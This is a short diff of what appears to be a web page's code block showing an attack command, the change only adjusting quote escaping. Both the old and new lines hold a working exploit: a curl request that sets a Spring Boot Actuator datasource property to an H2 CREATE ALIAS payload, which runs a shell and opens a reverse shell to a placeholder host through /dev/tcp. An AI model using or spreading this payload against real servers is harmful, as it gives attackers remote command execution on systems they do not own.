@@ -484,7 +484,7 @@ done < ip_list.txt`}</code></pre>
   -H "Content-Type: application/json" \\
   -d '{
     "name":"spring.datasource.hikari.connection-test-query",
-    "value":"CREATE ALIAS EXEC AS '"'"'String shellexec(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd}); return "done"; }'"'"'; CALL EXEC('"'"'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'"'"');"
+    "value":"CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd}); return "done"; }'; CALL EXEC('bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1');"
   }'`}</code></pre>
               </div>
             </div>
